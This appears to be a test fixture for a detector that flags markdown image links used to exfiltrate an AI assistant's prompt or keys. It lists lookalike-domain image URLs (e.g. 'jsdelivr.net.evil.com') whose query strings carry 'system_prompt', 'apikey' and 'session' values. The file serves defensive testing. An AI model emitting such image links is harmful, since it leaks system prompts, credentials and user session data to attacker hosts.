# v1.19.0 trusted-allowlist subdomain-spoof attack.
#
# Attack model: an attacker registers a domain that ends with a trusted-host
# TOKEN (e.g. `jsdelivr.net.attacker.com` or `stripe.com.evil.com`) hoping the
# allowlist check uses a substring/endsWith on the full hostname WITHOUT the
# leading dot. Our isTrustedAllowlistHost uses `h === t || h.endsWith("." + t)`
# so these MUST fall through to the unknown-host tier and fire as
# danger (strong key) or warning (weak key).

# Strong key on subdomain-spoof — MUST fire as danger:
![evil1](https://jsdelivr.net.evil.com/payload?prompt=leak)

# Strong key on TLD-spoof — MUST fire as danger:
![evil2](https://api.stripe.com.attacker.org/v1/charges?prompt=token)

# Strong key on auth0 lookalike — MUST fire as danger:
![evil3](https://login.auth0.com.evil.net/p?system_prompt=give)

# Strong key on intercom-shaped subdomain — MUST fire as danger:
![evil4](https://js.intercomcdn.com.evil.io/?apikey=AKIA)

# Weak key on cloudfront-lookalike — MUST fire as warning (unknown tier):
![evil5](https://d123.cloudfront.net.evil.host/img.png?session=victim)

# Reference image with subdomain spoof:
![spoofed][spoof-ref]

[spoof-ref]: https://github.com.attacker.io/repo/raw/main/x.png?prompt=leak

# HTML <img> with subdomain spoof:
<img src="https://stats.g.doubleclick.net.evil.org/p?prompt=track">
